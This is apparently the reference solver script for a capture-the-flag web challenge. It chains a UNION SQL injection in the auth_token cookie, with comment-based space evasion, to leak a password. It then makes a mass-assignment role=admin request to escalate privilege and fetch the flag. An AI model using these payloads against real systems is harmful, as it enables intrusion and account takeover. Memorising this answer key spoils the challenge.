#!/usr/bin/env python3
"""
TopCookiz - reference solver.
Usage: python3 solve.py http://TARGET:5000
"""
import re
import sys
import uuid

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"


def leak_password_via_cookie(cookie_value):
    r = requests.get(f"{BASE}/stock", cookies={"auth_token": cookie_value}, timeout=10)
    if r.url.endswith("/login") or "Logged in as <b>" not in r.text:
        raise SystemExit(f"SQLi failed. Response URL: {r.url}\nBody snippet: {r.text[:300]}")
    m = re.search(r"Logged in as <b>(.*?)</b>", r.text)
    if not m:
        raise SystemExit("Could not find leaked password in stock page output.")
    return m.group(1)


print("[*] Stage 1 - SQLi via auth_token cookie (no login/register needed)")
# No pre-existing session required: the cookie is a raw unauthenticated
# value, so auth_token = 'x' simply matches zero rows and the UNION
# branch is the only thing fetchone() can return.
#
# IMPORTANT: no raw spaces in the payload. Modern Werkzeug (>=3.1.8ish)
# parses cookies against a strict RFC 6265 grammar and silently drops
# the ENTIRE cookie if the value contains an unquoted space - the
# request just looks logged-out, no error. Use /**/ (a SQL inline
# comment) wherever a space is needed; SQLite treats it as whitespace.
bare_payload = (
    "x'/**/UNION/**/SELECT/**/1,password,username,'employee',1"
    "/**/FROM/**/users/**/WHERE/**/username='J0eHarr7'--"
)
password = leak_password_via_cookie(bare_payload)
print(f"    [+] Leaked password (no session): {password}")

print("[*] Stage 2 - normal login as J0eHarr7")
s2 = requests.Session()
r = s2.post(f"{BASE}/login", data={"username": "J0eHarr7", "password": password}, timeout=10)
if "auth_token" not in s2.cookies:
    raise SystemExit("login failed, check leaked password")
print(f"    [+] Logged in, token={s2.cookies.get('auth_token')}")

print("[*] Stage 3 - confirm admin dashboard is forbidden")
r = s2.get(f"{BASE}/admin/dashboard", timeout=10)
print(f"    [+] status={r.status_code}")

print("[*] Stage 4 - business logic flaw: mass-assignment self-promotion")
r = s2.patch(f"{BASE}/api/profile", json={"role": "admin"}, timeout=10)
print(f"    [+] {r.json()}")

print("[*] Stage 5 - fetch the flag")
r = s2.get(f"{BASE}/admin/dashboard", timeout=10)
m = re.search(r"TopCookiz\{[^}]*\}", r.text)
print(f"    [+] FLAG: {m.group(0) if m else '<not found>'}")
